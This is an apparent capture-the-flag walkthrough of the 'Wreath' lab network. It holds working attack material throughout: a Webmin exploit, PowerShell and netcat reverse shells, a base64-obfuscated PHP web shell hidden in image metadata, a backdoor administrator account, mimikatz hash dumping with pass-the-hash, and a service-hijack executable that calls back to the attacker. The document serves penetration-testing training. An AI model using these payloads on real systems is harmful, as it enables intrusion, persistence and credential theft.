# - Nmap
````bash
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-04T20:20:25
| Not valid after:  2024-08-03T20:20:25
| MD5:   e0ad:f3df:443a:760b:1d19:4ff7:7860:2456
|_SHA-1: aa1e:ddc4:41cd:958c:8efd:53a3:f43c:eedc:26a3:b202
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 1E5A7939D17BBCA08F889CB5A6E49621
|_http-title: Login to Webmin
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
````
- - On exploring the website I found nothing.
- - On observing I got **Miniserv** running on port 10000 with a vulnerable version.
- - On googling I found [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107) exploit.
````bash
└─$ python3 CVE-2019-15107.py 10.200.96.200

        __        __   _               _         ____   ____ _____                                                                                                                           
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                                          
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                                            
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                                           
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                                           
                                                                                                                                                                                             
                                                @MuirlandOracle                                                                                                                              
                                                                                                                                                                                             
                                                                                                                                                                                             
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.96.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                                                                                                           
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
````
- Next, is to stabilise the shell. To do so I got a reverse shell to my system using Netcat and run the following commands.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

ctrl+z

stty raw -echo;fg                                            
```
- Next for persistence, I cat the shadow file but was not able to crack the password.
- So, I copied the id_rsa file from the `/root/.ssh/` folder and paste it into my machine.
- Did `chmod +600 id_rsa` to get the field worked for ssh connections.
```bash
ssh -i id_rsa root@10.200.96.200
[root@prod-serv ~]# whoami
root
```
- Now, we have initial access to the machine. Let's do a quick transfer of the Nmap binary to the target and scan the network.
```bash
python -m http.server 80   # On the attacking machine

curl http://10.50.76.115/nmap -o nmap

 ./nmap -sn 10.200.96.0/24

Nmap scan report for ip-10-200-96-100.eu-west-1.compute.internal (10.200.96.100)
Host is up (0.00019s latency).
MAC Address: 02:87:9C:68:6C:41 (Unknown)
Nmap scan report for ip-10-200-96-150.eu-west-1.compute.internal (10.200.96.150)
Host is up (0.00016s latency).
MAC Address: 02:23:CB:7E:65:CD (Unknown)
Nmap scan report for ip-10-200-96-200.eu-west-1.compute.internal (10.200.96.200)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.93 seconds
```
- So, we found 2 machines in the internal network.
- Next, we have to make a reverse connection to the internal network, for this, we will use sshuttle with the private key.
```bash
sshuttle -r root@10.200.96.200 --ssh-cmd "ssh -i id_rsa" 10.200.96.0/24

c : Connected to server.
```
- On navigating to the webserver on port 80 I got a login interface.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/4f4f269f-eac0-4853-b787-147a74d4f729)

- Default credentials didn't work. So I tried to search for the Gitstack exploit.
```bash
└─$ searchsploit gitstack                                           
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                     | php/webapps/44044.md
GitStack 2.3.10 - Remote Code Execution                              | php/webapps/43777.py
```
- In the exploit, I modified the IP address and run the command.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/47489c47-0207-46ac-9582-1c37ec3c6ff2)

```bash
./43777.py

Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
--------------SNIP----------------
```
- Now I'm not able to get the reverse shell back to my system on trying to ping my IP address from the exploit script I was not able to communicate with my system.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/079d72ab-6557-482f-8e40-48c83446eef1)

```bash
└─$ ./43777.py  
Ping statistics for 10.50.76.115:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
```
- So, now I need to open a port through ssh connections.
```bash
firewall-cmd --zone=public --add-port 15500/tcp
success
```
- Now, transfer the netcat binary to the target host and set up the listener on port 15500.
```bash
./nc -nvlp 15500
```
- Now, I used the powershell reverse command to get a shell.
```bash
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- I used to encode the command and using the curl method I got the netcat shell on the ssh connection.
```
 curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.96.200%27%2C15500%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A%0A" http://10.200.96.150/web/exploit.php
```
```bash
Ncat: Connection from 10.200.96.150:51806.

PS C:\GitStack\gitphp> whoami
nt authority\system
```
- For persistence, I add a new user, with members of administrators and remote management users group.
```powershell
 net user badboy password123 /add

 net localgroup 'Administrators' badboy /add

 net localgroup "remote Management Users" badboy /add

 net user badboy
User name                    badboy
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            05/08/2023 22:23:17
Password expires             Never
Password changeable          05/08/2023 22:23:17
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
```
- Now I logged in using `xfreerdp` with the newly added user credentials.
```bash
 xfreerdp /u:badboy /p:password123 /v:10.200.96.150 +clipboard /drive:/home/singhx/labs,share
```
- By uploading the mimikatz, I dumped the sam file and save the administrator's hash for future use.
```powershell
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
```
- On cracking, I got the hash of user **Thomas** as **i<3ruby**.
- I login using `evil-winrm` by passing the hash of the user administrator.
```
evil-winrm -i 10.200.96.150 -u administrator -H  37db630168e5f82aafa8461e05c6bbd1
```
- Next task is to scan for the network ip 10.200.96.100 for this I use the [invoke-portscan.ps1](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1) powershell script.
```powershell
. .\portscan.ps1

Invoke-Portscan -Hosts 10.200.96.100 -TopPorts 50

Hostname      : 10.200.96.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}
finishTime    : 8/5/2023 11:49:59 PM
```
- Now, we need to make a connection from the target host to the attacking machine. For this, we need to open a port through the firewall.
```powershell
netsh advfirewall firewall add rule name="chisel" dir=in action=allow protocol=tcp localport=18000
```
- We will set up a server on the target host and a client connection on the attacking machine.
```powershell
.\chisel.exe server -p 18000 --socks5        # On Target Host

chisel client 10.200.96.150:18000 1080:socks        # On Attacking machine
```
- On navigating to the `http://10.200.96.100` we get the same interface as we get on `http://10.200.96.200`.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/598fd07f-f0f0-4590-883e-21819d2ef7ed)

- Through `evil-winrm` I downloaded the git-repo.
```bash
cd C:\gitstack\repositories

ls
    Directory: C:\gitstack\repositories

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git

download website.git
                                        
Info: Downloading C:\gitstack\repositories\website.git to website.git
                                        
Info: Download successful!
```
- Next, I rename the downloaded `website.git` directory to `.git`, and using the GitHub tool called `extractor` I extract the repo and found the contents of it.

```bash
└─$ ./extractor.sh <Path to .git repo> <Path to extract repo>
```
- I got three directories by extracting.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/c9225d33-913a-4cc2-ba56-14e162925fa4)

- On navigating to the directory **2-345ac8b236064b431fa43f53d91c98c4834ef8f3** I found the `index.php` file under the resources folder.
- Upon analysing the file I get to know that there is a filter bypassing there with only extensions jpeg, jpg png and gif allowed.
```php
$target = "uploads/".basename($_FILES["file"]["name"]);
		$goodExts = ["jpg", "jpeg", "png", "gif"];
		if(file_exists($target)){
			header("location: ./?msg=Exists");
			die();
		}
```
- With more analysis, the uploaded images are stored in the `/uploads` directory.
- Next, I navigate to `http://10.200.96.100/resources` and I got a login screen with credentials to enter.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/9c29a35c-6dc7-449b-8d96-950cd2b803ff)

- I use credentials that I cracked earlier in the SAM file and got login successfully.
```bash
Username = Thomas
Password = i<3ruby
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3e0f7b29-1c8d-4e7a-94a0-788f208b2d9c)

- On trying to upload a basic jpeg file I got the file uploaded successfully.
- Next, I tried altering the extension of the file to `image.jpeg.php` and it is successful.
- Now, I insert a simple PHP payload into the `jpeg.php` file by using `ExifTool` to see if it works.
```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" image.jpeg.php


 exiftool image.jpeg.php
                                                               
ExifTool Version Number         : 12.64
File Name                       : image.jpeg.php
Directory                       : .
File Size                       : 5.5 kB
-----------------------_SNIP----------------------
Color Transform                 : YCbCr
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Width                     : 600
Image Height                    : 400
```
- I uploaded the image and navigate the image that we uploaded I get the output of cmd.

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/32d47f3a-3360-4610-a944-759c4e607e9f)

- So, here our php command works perfectly. Next, I again upload a php malicious command with which we can able to extract information from the system. I need to obfuscate the command to make it work perfectly.
```bash
Command:

<?php
    $cmd = $_GET["command"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>


Encoded command: 
# With escaping $ sign with \

<?php \$f0=\$_GET[base64_decode('Y29tbWFuZA==')];if(isset(\$f0)){echo base64_decode('PHByZT4=').shell_exec(\$f0).base64_decode('PC9wcmU+');}die();?>
```
- Inserted the command in the image comment using the same ExifTool as we used before.
```bash
 exiftool -Comment="<?php \$f0=\$_GET[base64_decode('Y29tbWFuZA==')];if(isset(\$f0)){echo base64_decode('PHByZT4=').shell_exec(\$f0).base64_decode('PC9wcmU+');}die();?>" img.jpeg.php 
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/4a190827-9c63-4c9f-8417-586b48064a84)

- It works perfectly, next, I need to get a reverse shell on my system for this I upload a netcat to the target and execute it.
```bash
http://10.200.96.100/resources/uploads/imag.jpeg.php?command=curl%20http://10.50.76.115:800/nc64.exe%20-o%20C:\\Windows\\temp\\nc.exe
```

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/61aa5658-5fc8-4e8c-a774-9d7440c2182f)

- Now, it's time to get a reverse shell on our machine.
- By setting up Netcat listener on our machine and using PowerShell command on the website site we got a reverse shell back to our system.
```powershell
http://10.200.96.100/resources/uploads/imag.jpeg.php?command=powershell.exe%20c:\\windows\\temp\\nc.exe%2010.50.76.115%204444%20-e%20cmd.exe


└─$ rlwrap nc -nvlp 4444
C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas
```
- By using the command below, I found an unquoted path running as the system with full write access.
```powershell
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto


sc qc  SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
```
- Next, I made a `.c` file with the contents below and compile it using `mcs`
```powershell
using System;
using System.Diagnostics;
namespace exploit{
    class Program{
        static void Main(){
        	Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.76.115 9999 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
	}
    }
}
```
- Compile the file using `mcs`
```bash
mcs exploit.cs
```
- we got our Windows executable.
- I uploaded the Windows executable into `C:\Program Files (x86)\System Explorer\System.exe` and run the commands below with Netcat listening on our local machine.
```bash
sc stop SystemExplorerHelpService

sc start SystemExplorerHelpService


└─$ rlwrap nc -nvlp 9999
C:\Windows\system32>whoami
whoami
nt authority\system
```
